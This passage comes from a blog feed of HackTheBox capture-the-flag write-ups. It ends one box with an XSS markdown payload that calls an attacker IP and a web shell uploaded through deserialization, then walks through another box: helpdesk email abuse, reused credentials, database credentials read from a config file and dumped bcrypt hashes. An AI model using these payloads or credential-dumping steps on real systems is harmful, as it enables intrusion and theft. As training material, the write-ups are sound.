        <span style="color:#f92672">&lt;</span><span style="color:#a6e22e">MarkdownPreview</span> <span style="color:#a6e22e">markedOptions</span><span style="color:#f92672">=</span>{{ <span style="color:#a6e22e">sanitize</span><span style="color:#f92672">:</span> <span style="color:#66d9ef">true</span> }} <span style="color:#a6e22e">value</span><span style="color:#f92672">=</span>{<span style="color:#a6e22e">requestData</span>.<span style="color:#a6e22e">title</span>} <span style="color:#f92672">/&gt;</span> <span style="color:#75715e">// &lt;==
</span><span style="color:#75715e"></span>...<span style="color:#f92672">&lt;</span><span style="color:#a6e22e">SNIP</span><span style="color:#f92672">&gt;</span>...
</code></pre></div><p>I could confirm the vulnerability with the following payload:</p>
<pre><code>[XSS](javascript: document.write`&lt;img src='http://10.10.14.3/iamf'/&gt;`)
</code></pre><p><img class="img-container" src="imgs/image-20210605212246743.png" alt="image-20210605212246743"  />
</p>
<p>With a few experiments, URL encoding seems to work as well</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-markdown" data-lang="markdown">[<span style="color:#f92672">XSS</span>](<span style="color:#a6e22e">javascript: document.write%28%22&lt;img src=&#39;http://10.10.14.3/iamf&#39;&gt;%22%29</span>)
</code></pre></div><h2 id="foothold">Foothold</h2>
<h3 id="shell-as-sonny">Shell as Sonny</h3>
<h4 id="web-shell-upload-via-xss-and-deserialization">Web Shell Upload via XSS and Deserialization</h4>
<p>I&rsquo;ll summarize that:</p>
<ul>
<li>There is an uploads directory at <code>https://source.cereal.htb/uploads/</code>.</li>
<li>From the previous code analysis, the gadget class are filtered, but there is one class called <code>DownloadHelper</code> that can be accessed and it has a download function.</li>
<li>There is a SSRF (not sure yet) in the Title section, which can be used along with the XSS vulnerability to bypass the IP restriction.</li>
</ul>
<p>The tactics:</p>
<ul>
<li><a href="https://speakerdeck.com/pwntester/attacking-net-serialization?slide=25">Serialized</a> <code>DownloadHelper</code> class which contains a web shell URL that points to the attacking machine, and send it via the Cereal Request, note the ID.</li>
<li>Use XSS which bypasses the IP restriction, to make a GET request to <code>cereal.htb/request/{the ID}</code> to trigger the deserialization,</li>
<li>Confirms the web shell at <code>https://cereal.source.htb/uploads/shell-name.aspx</code></li>
</ul>
<p>I already made a <a href="https://gist.github.com/fahmifj/c935b12c4b0a66ee30a7aa825d3c7fe1">script</a> to chain those vulnerabilities:</p>
<p><img class="img-container" src="imgs/image-20210609125605658.png" alt="image-20210609125605658"  />
</p>
<blockquote>
<p>That&rsquo;s on different IP because I decided to ran the exploit again to make sure it&rsquo;s still work XD</p>
</blockquote>
<p>I can access my web shell on <code>http://source.cereal.htb/uploads/iamf.aspx</code></p>
<p><img class="img-container" src="imgs/image-20210609125710180.png" alt="image-20210609125710180"  />
</p>
<h3 id="ssh---sonny">SSH - sonny</h3>
<p>A quick check on the web directory, I find the <code>cereal.db</code> at <code>c:\inetpub\cereal\db\cereal.db</code> and it contains a string that looks like a set of credentials.</p>
<p><img class="img-container" src="imgs/image-20210609133307066.png" alt="image-20210609133307066"  />
</p>
<p>I tried it on SSH (<code>sonny:mutual.madden.manner38974</code>) and it worked.</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-text" data-lang="text">→ root@kali «exploits» «10.10.14.2» 
$ ssh sonny@cereal.htb
sonny@cereal.htb&#39;s password: 
Microsoft Windows [Version 10.0.17763.1817]
(c) 2018 Microsoft Corporation. All rights reserved.

sonny@CEREAL C:\Users\sonny&gt;dir desktop\ 
 Volume in drive C has no label.                   
 Volume Serial Number is C4EF-2153                 
                                                   
 Directory of C:\Users\sonny\desktop               
                                                   
11/16/2020  05:19 AM    &lt;DIR&gt;          .           
11/16/2020  05:19 AM    &lt;DIR&gt;          ..          
06/07/2021  09:59 PM                34 user.txt    
               1 File(s)             34 bytes      
               2 Dir(s)   7,621,619,712 bytes free 
</code></pre></div><h2 id="privilege-escalation">Privilege Escalation</h2>
<p>It&rsquo;s retired already.</p>
<h2 id="references">References</h2>
<ul>
<li><a href="https://curity.io/resources/learn/jwt-best-practices/#4-always-check-the-issuer">https://curity.io/resources/learn/jwt-best-practices/#4-always-check-the-issuer</a></li>
<li><a href="https://docs.microsoft.com/en-us/dotnet/standard/serialization/system-text-json-how-to?pivots=dotnet-5-0">https://docs.microsoft.com/en-us/dotnet/standard/serialization/system-text-json-how-to?pivots=dotnet-5-0</a></li>
<li><a href="https://stackoverflow.com/questions/40898632/parentheses-alternatives-in-js-if-any">https://stackoverflow.com/questions/40898632/parentheses-alternatives-in-js-if-any</a></li>
</ul>
]]></content:encoded>
    </item>
    
    <item>
      <title>HackTheBox - Delivery</title>
      <link>https://fahmifj.github.io/writeups/hackthebox/htb-delivery/</link>
      <pubDate>Tue, 25 May 2021 05:36:18 +0700</pubDate>
      
      <guid>https://fahmifj.github.io/writeups/hackthebox/htb-delivery/</guid>
      <description>Exploiting a logic flaw called TicketTrick</description>
      <content:encoded><![CDATA[<p>Delivery from HackTheBox is all about exploiting a logic flaw called TicketTrick which was discovered by <a href="https://medium.com/intigriti/how-i-hacked-hundreds-of-companies-through-their-helpdesk-b7680ddc2d4c">Inti De Ceukelaire</a>.</p>
<p>On this machine, there is a helpdesk ticketing system that gives an unauthenticated user a temporary email with a legitimate company domain. Using that email, I&rsquo;m able to register at Mattermost and gain access to the company private communication channel. The conversation in the channel leaks a set of SSH credentials and a password in which its variant is being used in the system. There is a set of database credentials in the Mattermost configuration file, which can be used to dump the password hash of the root account. After generating a variant of the exposed password with hashcat, I&rsquo;m able to crack the password and obtain root access.</p>
<h3 id="skills-learned">Skills Learned</h3>
<ul>
<li>TicketTrick</li>
<li>Generating wordlist using hashcat</li>
</ul>
<h3 id="tools">Tools</h3>
<ul>
<li>Kali Linux (Attacking Machine) - <a href="https://www.kali.org/">https://www.kali.org/</a></li>
<li>Nmap - Preinstalled in Kali Linux</li>
<li><a href="https://hashcat.net/">hashcat</a></li>
</ul>
<h2 id="reconnaissance">Reconnaissance</h2>
<h3 id="nmap">Nmap</h3>
<p><code>nmap</code> full TCP scan discovers three open ports: An SSH on port 22, an HTTP server on port 80, and an unknown service on port 8065</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-text" data-lang="text">→ root@kali «delivery» «10.10.14.70» 
$ nmap -p- --min-rate 1000 -sV --reason -oA nmap/10-tcp-allport-delivery 10.10.10.222 
Starting Nmap 7.80 ( https://nmap.org ) at 2021-05-21 14:58 EDT
....
PORT     STATE SERVICE REASON         VERSION
22/tcp   open  ssh     syn-ack ttl 63 OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0)
80/tcp   open  http    syn-ack ttl 63 nginx 1.14.2
8065/tcp open  unknown syn-ack ttl 63
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
SF-Port8065-TCP:V=7.80%I=7%D=5/21%Time=60A80336%P=x86_64-pc-linux-gnu%r(Ge
SF:nericLines,67,&#34;HTTP/1\.1\x20400\x20Bad\x20Request\r\nContent-Type:\x20t
SF:ext/plain;\x20charset=utf-8\r\nConnection:\x20close\r\n\r\n400\x20Bad\x
SF:20Request&#34;)%r(GetRequest,DF3,&#34;HTTP/1\.0\x20200\x20OK\r\nAccept-Ranges:\
....

→ root@kali «delivery» «10.10.14.70» 
$ nmap -p22,80,8065 --min-rate 1000 -sC --reason -oA nmap/10-tcp-allport-delivery 10.10.10.222
Starting Nmap 7.80 ( https://nmap.org ) at 2021-05-21 15:06 EDT
Nmap scan report for 10.10.10.222
Host is up, received echo-reply ttl 63 (0.45s latency).

PORT     STATE SERVICE REASON
22/tcp   open  ssh     syn-ack ttl 63
| ssh-hostkey: 
|   2048 9c:40:fa:85:9b:01:ac:ac:0e:bc:0c:19:51:8a:ee:27 (RSA)
|   256 5a:0c:c0:3b:9b:76:55:2e:6e:c4:f4:b9:5d:76:17:09 (ECDSA)
|_  256 b7:9d:f7:48:9d:a2:f2:76:30:fd:42:d3:35:3a:80:8c (ED25519)
80/tcp   open  http    syn-ack ttl 63
|_http-title: Welcome
8065/tcp open  unknown syn-ack ttl 63
</code></pre></div><p>I can clearly see the fingerprint of port 8065 indicate that it&rsquo;s a HTTP server. I can confirm it with <code>curl</code>.</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-shell" data-lang="shell">→ root@kali «delivery» «10.10.14.70» 
$ curl -sI 10.10.10.222:8065
HTTP/1.1 <span style="color:#ae81ff">405</span> Method Not Allowed
Date: Fri, <span style="color:#ae81ff">21</span> May <span style="color:#ae81ff">2021</span> 19:09:14 GMT
</code></pre></div><h2 id="enumeration">Enumeration</h2>
<h3 id="tcp-80---website">TCP 80 - Website</h3>
<p>This page is a static website.</p>
<p><img class="img-container" src="imgs/image-20210522022202624.png" alt="image-20210522022202624"  />
</p>
<p>The text “HELPDESK” points to <code>http://helpdesk.delivery.htb/ </code>.  Clicking on the &ldquo;CONTACT US&rdquo; flips the homepage to this views:</p>
<p><img class="img-container" src="imgs/image-20210522022535948.png" alt="image-20210522022535948"  />
</p>
<p>The text “MatterMost server” points to <code>http://delivery.htb:8065</code>.</p>
<p>I can use <code>curl</code> and <code>grep</code> command to grab all the links/URL from this page.</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-shell" data-lang="shell">→ root@kali «delivery» «10.10.14.70» 
$ curl -s 10.10.10.222 | grep -Eo <span style="color:#e6db74">&#39;href=&#34;[^\&#34;]+&#34;&#39;</span> | grep -v <span style="color:#e6db74">&#39;#&#39;</span>
href<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;assets/css/main.css&#34;</span>
href<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;assets/css/ie9.css&#34;</span>
href<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;assets/css/noscript.css&#34;</span>
href<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;http://helpdesk.delivery.htb&#34;</span>
href<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;http://helpdesk.delivery.htb&#34;</span>
href<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;http://delivery.htb:8065&#34;</span>
href<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;https://html5up.net&#34;</span>
</code></pre></div><p>I’ll add the newly discovered hostnames to my <code>/etc/hosts</code>:</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-shell" data-lang="shell">→ root@kali «delivery» «10.10.14.70» 
$ echo <span style="color:#e6db74">&#39;10.10.10.222 delivery.htb helpdesk.delivery.htb&#39;</span> &gt; /etc/hosts
</code></pre></div><p>Before moving on, we can poke the hostnames and compare their page size to check if this site has different content when we visit it with a hostname.</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-shell" data-lang="shell">→ root@kali «delivery» «10.10.14.70» 
$ curl -s http://10.10.10.222/ | wc -c
<span style="color:#ae81ff">10850</span>
→ root@kali «delivery» «10.10.14.70» 
$ curl -s http://delivery.htb/ | wc -c
<span style="color:#ae81ff">10850</span>
→ root@kali «delivery» «10.10.14.70» 
$ curl -s http://helpdesk.delivery.htb/ | wc -c
<span style="color:#ae81ff">4933</span>
</code></pre></div><p>There is only one page that has different in size.</p>
<p>I did a <code>gobuster</code> scan but find nothing useful in the results, so I&rsquo;ll move to the next prt.</p>
<h3 id="tcp-80---helpdeskdeliveryhtb">TCP 80 - helpdesk.delivery.htb</h3>
<p>There is a helpdesk ticketing system here. At the bottom of the page it shows it is powered by <a href="https://osticket.com/">osTicket</a>.</p>
<p><img class="img-container" src="imgs/image-20210522024708233.png" alt="image-20210522024708233"  />
</p>
<p>The &ldquo;Open a New Ticket&rdquo; menu.</p>
<p><img class="img-container" src="imgs/image-20210522025616599.png" alt="image-20210522025616599"  />
</p>
<p>The &ldquo;Check Ticket Status&rdquo; menu.</p>
<p><img class="img-container" src="imgs/image-20210522025147588.png" alt="image-20210522025147588"  />
</p>
<h4 id="open-a-new-ticket">Open a New Ticket</h4>
<p>According to the message at <code>http://delivery.htb/#contact-us</code>, guest user seems to be allowed to create a ticket here.</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-text" data-lang="text">For unregistered users, please use our HelpDesk to get in touch with our team. 
Once you have an @delivery.htb email address, you&#39;ll be able to have access to our MatterMost server.
</code></pre></div><p>I&rsquo;ll create one.</p>
<p><img class="img-container" src="imgs/image-20210522030005601.png" alt="image-20210522030005601"  />
</p>
<p>Once the ticket request is submitted, it notifies that the ticket has been created.</p>
<p><img class="img-container" src="imgs/image-20210522030208711.png" alt="image-20210522030208711"  />
</p>
<p>Besides the ticket id, it also gives us a temporary email with domain of <code>delivery.htb</code>, and I&rsquo;ll note that:</p>
<ul>
<li>Ticket : 4709941</li>
<li>Email: <a href="mailto:4709941@delivery.htb">4709941@delivery.htb</a>.</li>
</ul>
<p>The created ticket can be accessed/viewed on “Check Ticket Status” menu.</p>
<p><img class="img-container" src="imgs/image-20210522030510810.png" alt="image-20210522030510810"  />
</p>
<h3 id="finding-vulnerabilities---exploit-db">Finding vulnerabilities - Exploit-DB</h3>
<p>The app source code is available on Github: <a href="https://github.com/osTicket/osTicket">https://github.com/osTicket/osTicket</a>. But, it seems I&rsquo;ll need an admin access to find the version.</p>
<p>You guess it, we can limit the search based on the box release (9 January 2021):</p>
<p><img class="img-container" src="imgs/image-20210522031957741.png" alt="image-20210522031957741"  />
</p>
<p>But those exploits mostly XSS that requires a user interaction and there is no indication for that in this box, so let’s move to the next one.</p>
<h3 id="tcp-8065--mattermost">TCP 8065 — Mattermost</h3>
<p>There is an instance of Mattermost here and it requires an account.</p>
<p><img class="img-container" src="imgs/image-20210522032634304.png" alt="image-20210522032634304"  />
</p>
<p>Sign up is allowed, but the page clearly shows that valid email is required.</p>
<p><img class="img-container" src="imgs/image-20210522032749098.png" alt="image-20210522032749098"  />
</p>
<p>And here is why a valid email is required, there is a verification process.</p>
<p><img class="img-container" src="imgs/image-20210522033006957.png" alt="image-20210522033006957"  />
</p>
<h2 id="foothold">Foothold</h2>
<h3 id="shell-as-maildeliverer">Shell as maildeliverer</h3>
<h4 id="access-to-mattermost-using-tickettrick">Access to Mattermost using TicketTrick</h4>
<p>The idea of TicketTrick here is to use the temporary email address given by the support ticket system to register on Mattermost.</p>
<p>For me, the previous email is: <code>4709941@delivery.htb</code>. I’ll use that to register on Mattermost.</p>
<p><img class="img-container" src="imgs/image-20210522034638745.png" alt="image-20210522034638745"  />
</p>
<p>The verification is sent to <code>4709941@delivery.htb</code>.</p>
<p><img class="img-container" src="imgs/image-20210522034704297.png" alt="image-20210522034704297"  />
</p>
<p>Back on helpdesk, I can see the verification link to activate the my previously created Mattermost account.</p>
<p><img class="img-container" src="imgs/image-20210522034915465.png" alt="image-20210522034915465"  />
</p>
<p>Visiting <code>http://delivery.htb:8065/do_verify_email?token=eoy11mus8h6m4hctpmwt9qw31cdsfcxzbg7noyc5gzpc6htp9e8mqe55wwewaju9&amp;email=4709941%40delivery.htb</code> redirects back to MatterMost which confirms the email has been verified.</p>
<p><img class="img-container" src="imgs/image-20210522035035109.png" alt="image-20210522035035109"  />
</p>
<p>Upon logging in, I&rsquo;m able to join the Internal channel (like server on Discord). There is one channel called internal.</p>
<p><img class="img-container" src="imgs/image-20210522035330637.png" alt="image-20210522035330637"  />
</p>
<p>The chats from root contain a set of credentials and a few hints which indicates that they use a variant password of “PleaseSubscribe!”.</p>
<h4 id="ssh---maildeliverer">SSH - maildeliverer</h4>
<p>The credentials of maildeliverer works on SSH.</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-text" data-lang="text">→ root@kali «delivery» «10.10.14.70» 
$ ssh maildeliverer@delivery.htb
...
maildeliverer@delivery.htb&#39;s password: 
Linux Delivery 4.19.0-13-amd64 #1 SMP Debian 4.19.160-2 (2020-11-28) x86_64

...
Last login: Fri May 21 14:11:23 2021 from 10.10.16.16
maildeliverer@Delivery:~$ id
uid=1000(maildeliverer) gid=1000(maildeliverer) groups=1000(maildeliverer)
</code></pre></div><p>The user flag is done here.</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-text" data-lang="text">maildeliverer@Delivery:~$ ls -l
total 4
-r-------- 1 maildeliverer maildeliverer 33 May 21 11:21 user.txt
</code></pre></div><p><img class="img-container" src="imgs/image-20210522040053221.png" alt="image-20210522040053221"  />
</p>
<h2 id="privilege-escalation">Privilege Escalation</h2>
<h3 id="shell-as-root">Shell as root</h3>
<h4 id="internal-enumeration">Internal Enumeration</h4>
<p>Enumerating on <code>/opt</code> finds the Mattermost installation folder. The Mattermost config file contains the database credentials.</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-shell" data-lang="shell">maildeliverer@Delivery:/opt/mattermost/config$ cat config.json | grep SqlSetting -A10
    <span style="color:#e6db74">&#34;SqlSettings&#34;</span>: <span style="color:#f92672">{</span>
        <span style="color:#e6db74">&#34;DriverName&#34;</span>: <span style="color:#e6db74">&#34;mysql&#34;</span>,
        <span style="color:#e6db74">&#34;DataSource&#34;</span>: <span style="color:#e6db74">&#34;mmuser:Crack_The_MM_Admin_PW@tcp(127.0.0.1:3306)/mattermost?charset=utf8mb4,utf8\u0026readTimeout=30s\u0026writeTimeout=30s&#34;</span>,
        <span style="color:#e6db74">&#34;DataSourceReplicas&#34;</span>: <span style="color:#f92672">[]</span>,
        <span style="color:#e6db74">&#34;DataSourceSearchReplicas&#34;</span>: <span style="color:#f92672">[]</span>,
        <span style="color:#e6db74">&#34;MaxIdleConns&#34;</span>: 20,
        <span style="color:#e6db74">&#34;ConnMaxLifetimeMilliseconds&#34;</span>: 3600000,
        <span style="color:#e6db74">&#34;MaxOpenConns&#34;</span>: 300,
        <span style="color:#e6db74">&#34;Trace&#34;</span>: false,
        <span style="color:#e6db74">&#34;AtRestEncryptKey&#34;</span>: <span style="color:#e6db74">&#34;n5uax3d4f919obtsp1pw1k5xetq1enez&#34;</span>,
        <span style="color:#e6db74">&#34;QueryTimeout&#34;</span>: 30,
</code></pre></div><p>The credentials is <code>mmuser:Crack_The_MM_Admin_PW</code>.</p>
<h4 id="mysql---dump-passwords">MySQL - Dump Passwords</h4>
<p>With database credentials, I can connect to the MySQL service.</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-mysql" data-lang="mysql">maildeliverer<span style="color:#f92672">@</span>Delivery:<span style="color:#f92672">/</span>opt<span style="color:#f92672">/</span>mattermost<span style="color:#f92672">/</span>config<span style="color:#960050;background-color:#1e0010">$</span> mysql mattermost <span style="color:#f92672">-</span>u mmuser <span style="color:#f92672">-</span>pCrack_The_MM_Admin_PW
Reading <span style="color:#66d9ef">table</span> information <span style="color:#66d9ef">for</span> completion of <span style="color:#66d9ef">table</span> <span style="color:#66d9ef">and</span> <span style="color:#66d9ef">column</span> names
You can turn off this feature <span style="color:#66d9ef">to</span> get a quicker startup <span style="color:#66d9ef">with</span> <span style="color:#f92672">-</span>A

Welcome <span style="color:#66d9ef">to</span> the MariaDB monitor.  Commands end <span style="color:#66d9ef">with</span> ; <span style="color:#66d9ef">or</span> <span style="color:#960050;background-color:#1e0010">\</span>g.
Your MariaDB connection id <span style="color:#66d9ef">is</span> <span style="color:#ae81ff">395</span>
Server version: <span style="color:#ae81ff">10</span>.<span style="color:#ae81ff">3</span>.<span style="color:#ae81ff">27</span><span style="color:#f92672">-</span>MariaDB<span style="color:#f92672">-</span><span style="color:#ae81ff">0</span><span style="color:#f92672">+</span>deb10u1 Debian <span style="color:#ae81ff">10</span>

<span style="color:#a6e22e">Copyright</span> (c) <span style="color:#ae81ff">2000</span>, <span style="color:#ae81ff">2018</span>, Oracle, MariaDB Corporation Ab <span style="color:#66d9ef">and</span> others.

Type <span style="color:#e6db74">&#39;help;&#39;</span> <span style="color:#66d9ef">or</span> <span style="color:#e6db74">&#39;\h&#39;</span> <span style="color:#66d9ef">for</span> help. Type <span style="color:#e6db74">&#39;\c&#39;</span> <span style="color:#66d9ef">to</span> clear the current input statement.

MariaDB [mattermost]<span style="color:#f92672">&gt;</span>
</code></pre></div><p>There is a users table which usually contains something juicy.</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-mysql" data-lang="mysql">MariaDB [mattermost]<span style="color:#f92672">&gt;</span> <span style="color:#66d9ef">show</span> <span style="color:#66d9ef">tables</span>;
<span style="color:#f92672">+------------------------+</span>
<span style="color:#f92672">|</span> Tables_in_mattermost   <span style="color:#f92672">|</span>
<span style="color:#f92672">+------------------------+</span>
...
<span style="color:#f92672">|</span> Users                  <span style="color:#f92672">|</span>
<span style="color:#f92672">+------------------------+</span>
<span style="color:#ae81ff">46</span> rows <span style="color:#66d9ef">in</span> <span style="color:#66d9ef">set</span> (<span style="color:#ae81ff">0</span>.<span style="color:#ae81ff">001</span> sec)
</code></pre></div><p>I can get the columns of the table user by querying <code>describe Users;</code>.</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-mysql" data-lang="mysql">MariaDB [mattermost]<span style="color:#f92672">&gt;</span> <span style="color:#66d9ef">describe</span> Users;
<span style="color:#f92672">+--------------------+--------------+------+-----+---------+-------+</span>
<span style="color:#f92672">|</span> Field              <span style="color:#f92672">|</span> Type         <span style="color:#f92672">|</span> <span style="color:#66d9ef">Null</span> <span style="color:#f92672">|</span> <span style="color:#66d9ef">Key</span> <span style="color:#f92672">|</span> <span style="color:#66d9ef">Default</span> <span style="color:#f92672">|</span> Extra <span style="color:#f92672">|</span>
<span style="color:#f92672">+--------------------+--------------+------+-----+---------+-------+</span>
<span style="color:#f92672">|</span> Id                 <span style="color:#f92672">|</span> <span style="color:#66d9ef">varchar</span>(<span style="color:#ae81ff">26</span>)  <span style="color:#f92672">|</span> NO   <span style="color:#f92672">|</span> PRI <span style="color:#f92672">|</span> <span style="color:#66d9ef">NULL</span>    <span style="color:#f92672">|</span>       <span style="color:#f92672">|</span>
<span style="color:#f92672">|</span> CreateAt           <span style="color:#f92672">|</span> <span style="color:#66d9ef">bigint</span>(<span style="color:#ae81ff">20</span>)   <span style="color:#f92672">|</span> YES  <span style="color:#f92672">|</span> MUL <span style="color:#f92672">|</span> <span style="color:#66d9ef">NULL</span>    <span style="color:#f92672">|</span>       <span style="color:#f92672">|</span>
<span style="color:#f92672">|</span> UpdateAt           <span style="color:#f92672">|</span> <span style="color:#66d9ef">bigint</span>(<span style="color:#ae81ff">20</span>)   <span style="color:#f92672">|</span> YES  <span style="color:#f92672">|</span> MUL <span style="color:#f92672">|</span> <span style="color:#66d9ef">NULL</span>    <span style="color:#f92672">|</span>       <span style="color:#f92672">|</span>
<span style="color:#f92672">|</span> DeleteAt           <span style="color:#f92672">|</span> <span style="color:#66d9ef">bigint</span>(<span style="color:#ae81ff">20</span>)   <span style="color:#f92672">|</span> YES  <span style="color:#f92672">|</span> MUL <span style="color:#f92672">|</span> <span style="color:#66d9ef">NULL</span>    <span style="color:#f92672">|</span>       <span style="color:#f92672">|</span>
<span style="color:#f92672">|</span> Username           <span style="color:#f92672">|</span> <span style="color:#66d9ef">varchar</span>(<span style="color:#ae81ff">64</span>)  <span style="color:#f92672">|</span> YES  <span style="color:#f92672">|</span> UNI <span style="color:#f92672">|</span> <span style="color:#66d9ef">NULL</span>    <span style="color:#f92672">|</span>       <span style="color:#f92672">|</span>
<span style="color:#f92672">|</span> Password           <span style="color:#f92672">|</span> <span style="color:#66d9ef">varchar</span>(<span style="color:#ae81ff">128</span>) <span style="color:#f92672">|</span> YES  <span style="color:#f92672">|</span>     <span style="color:#f92672">|</span> <span style="color:#66d9ef">NULL</span>    <span style="color:#f92672">|</span>       <span style="color:#f92672">|</span>
...
<span style="color:#f92672">+--------------------+--------------+------+-----+---------+-------+</span>
<span style="color:#ae81ff">25</span> rows <span style="color:#66d9ef">in</span> <span style="color:#66d9ef">set</span> (<span style="color:#ae81ff">0</span>.<span style="color:#ae81ff">001</span> sec)
</code></pre></div><p>I&rsquo;ll dump that the username and password columns from the table Users.</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-mysql" data-lang="mysql">MariaDB [mattermost]<span style="color:#f92672">&gt;</span> <span style="color:#66d9ef">select</span> Username,Password <span style="color:#66d9ef">from</span> Users;
<span style="color:#f92672">+----------------------------------+--------------------------------------------------------------+</span>
<span style="color:#f92672">|</span> Username                         <span style="color:#f92672">|</span> Password                                                     <span style="color:#f92672">|</span>
<span style="color:#f92672">+----------------------------------+--------------------------------------------------------------+</span>
<span style="color:#f92672">|</span> surveybot                        <span style="color:#f92672">|</span>                                                              <span style="color:#f92672">|</span>
<span style="color:#f92672">|</span> c3ecacacc7b94f909d04dbfd308a9b93 <span style="color:#f92672">|</span> <span style="color:#960050;background-color:#1e0010">$</span><span style="color:#ae81ff">2</span>a<span style="color:#960050;background-color:#1e0010">$</span><span style="color:#ae81ff">10</span><span style="color:#960050;background-color:#1e0010">$</span>u5815SIBe2Fq1FZlv9S8I.VjU3zeSPBrIEg9wvpiLaS7ImuiItEiK <span style="color:#f92672">|</span>
<span style="color:#f92672">|</span> <span style="color:#ae81ff">5</span>b785171bfb34762a933e127630c4860 <span style="color:#f92672">|</span> <span style="color:#960050;background-color:#1e0010">$</span><span style="color:#ae81ff">2</span>a<span style="color:#960050;background-color:#1e0010">$</span><span style="color:#ae81ff">10</span><span style="color:#960050;background-color:#1e0010">$</span><span style="color:#ae81ff">3</span>m0quqyvCE8Z<span style="color:#f92672">/</span>R1gFcCOWO6tEj6FtqtBn8fRAXQXmaKmg.HDGpS<span style="color:#f92672">/</span>G <span style="color:#f92672">|</span>
<span style="color:#f92672">|</span> testmail                         <span style="color:#f92672">|</span> <span style="color:#960050;background-color:#1e0010">$</span><span style="color:#ae81ff">2</span>a<span style="color:#960050;background-color:#1e0010">$</span><span style="color:#ae81ff">10</span><span style="color:#960050;background-color:#1e0010">$</span>gSBaz3a76sX.ikqynx4E7O2NYn9.q6fcSopTwYP672lJMSbZ6.IQa <span style="color:#f92672">|</span>
<span style="color:#f92672">|</span> help                             <span style="color:#f92672">|</span> <span style="color:#960050;background-color:#1e0010">$</span><span style="color:#ae81ff">2</span>a<span style="color:#960050;background-color:#1e0010">$</span><span style="color:#ae81ff">10</span><span style="color:#960050;background-color:#1e0010">$</span>zsb4KbggZbpQi2Wa8W0.C.lHVJxiUBr6cyNFbDbWu11j6JBJrVkpm <span style="color:#f92672">|</span>
<span style="color:#f92672">|</span> root                             <span style="color:#f92672">|</span> <span style="color:#960050;background-color:#1e0010">$</span><span style="color:#ae81ff">2</span>a<span style="color:#960050;background-color:#1e0010">$</span><span style="color:#ae81ff">10</span><span style="color:#960050;background-color:#1e0010">$</span>VM6EeymRxJ29r8Wjkr8Dtev0O.<span style="color:#ae81ff">1</span>STWb4.<span style="color:#ae81ff">4</span>ScG.anuu7v0EFJwgjjO <span style="color:#f92672">|</span>
<span style="color:#f92672">|</span> ff0a21fc6fc2488195e16ea854c963ee <span style="color:#f92672">|</span> <span style="color:#960050;background-color:#1e0010">$</span><span style="color:#ae81ff">2</span>a<span style="color:#960050;background-color:#1e0010">$</span><span style="color:#ae81ff">10</span><span style="color:#960050;background-color:#1e0010">$</span>RnJsISTLc9W3iUcUggl1KOG9vqADED24CQcQ8zvUm1Ir9pxS.Pduq <span style="color:#f92672">|</span>
<span style="color:#f92672">|</span> channelexport                    <span style="color:#f92672">|</span>                                                              <span style="color:#f92672">|</span>
<span style="color:#f92672">|</span> <span style="color:#ae81ff">9</span>ecfb4be145d47fda0724f697f35ffaf <span style="color:#f92672">|</span> <span style="color:#960050;background-color:#1e0010">$</span><span style="color:#ae81ff">2</span>a<span style="color:#960050;background-color:#1e0010">$</span><span style="color:#ae81ff">10</span><span style="color:#960050;background-color:#1e0010">$</span>s.cLPSjAVgawGOJwB7vrqenPg2lrDtOECRtjwWahOzHfq1CoFyFqm <span style="color:#f92672">|</span>
<span style="color:#f92672">|</span> aaaa                             <span style="color:#f92672">|</span> <span style="color:#960050;background-color:#1e0010">$</span><span style="color:#ae81ff">2</span>a<span style="color:#960050;background-color:#1e0010">$</span><span style="color:#ae81ff">10</span><span style="color:#960050;background-color:#1e0010">$</span>yIdqqOXl.<span style="color:#ae81ff">5</span>dcWsXk.Doo2ewl.zTFdsDd2F0.c44iWOpGMIgmDTsY6 <span style="color:#f92672">|</span>
<span style="color:#f92672">|</span> iiamf                            <span style="color:#f92672">|</span> <span style="color:#960050;background-color:#1e0010">$</span><span style="color:#ae81ff">2</span>a<span style="color:#960050;background-color:#1e0010">$</span><span style="color:#ae81ff">10</span><span style="color:#960050;background-color:#1e0010">$</span>esA8d<span style="color:#f92672">/</span>l5.IKQJIhnl2SeYeeoFaCOE6Z<span style="color:#f92672">/</span>esUOSuRb.Vqtkf3gvbli6 <span style="color:#f92672">|</span>
